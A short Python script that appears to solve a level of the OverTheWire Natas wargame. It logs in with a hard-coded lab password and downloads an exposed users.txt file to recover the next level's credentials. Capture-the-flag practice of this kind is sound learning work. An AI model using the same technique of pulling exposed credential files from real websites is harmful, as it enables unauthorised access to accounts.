#!/usr/bin/env python

import requests
import re

username = 'natas2'
password = 'h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7'

url = 'http://%s.natas.labs.overthewire.org/files/users.txt' % username

response = requests.get(url, auth = (username, password))
content = response.text

print(content)
#print(re.findall('<!--The password for natas3 is (.*) -->', content))